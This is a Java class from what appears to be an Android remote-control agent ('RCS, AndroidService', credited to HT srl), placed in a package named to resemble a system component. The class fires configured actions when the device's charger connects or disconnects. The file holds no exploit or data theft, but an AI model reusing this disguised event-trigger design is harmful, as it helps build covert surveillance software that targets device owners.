/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventAc.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.event;

import com.android.syssetup.Ac;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfEvent;
import com.android.syssetup.interfaces.Observer;
import com.android.syssetup.listener.ListenerAc;
import com.android.syssetup.util.Check;

public class EventAc extends BaseEvent implements Observer<Ac> {
	/** The Constant TAG. */
	private static final String TAG = "EventAc"; //$NON-NLS-1$

	private int actionOnExit, actionOnEnter;
	private boolean inRange = false;

	@Override
	public void actualStart() {
		ListenerAc.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerAc.self().detach(this);
		onExit(); // di sicurezza
	}

	@Override
	public void actualGo() {

	}

	@Override
	protected boolean parse(ConfEvent conf) {

		return true;
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Ac a) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Got power status notification: " + a.getStatus());//$NON-NLS-1$
		}

		// Nel range
		if (a.getStatus() == true && inRange == false) {
			inRange = true;

			if (Cfg.DEBUG) {
				Check.log(TAG + " AC IN");//$NON-NLS-1$
			}

			onEnter();
		} else if (a.getStatus() == false && inRange == true) {
			inRange = false;

			if (Cfg.DEBUG) {
				Check.log(TAG + " AC OUT");//$NON-NLS-1$
			}

			onExit();
		}

		return 0;
	}
}
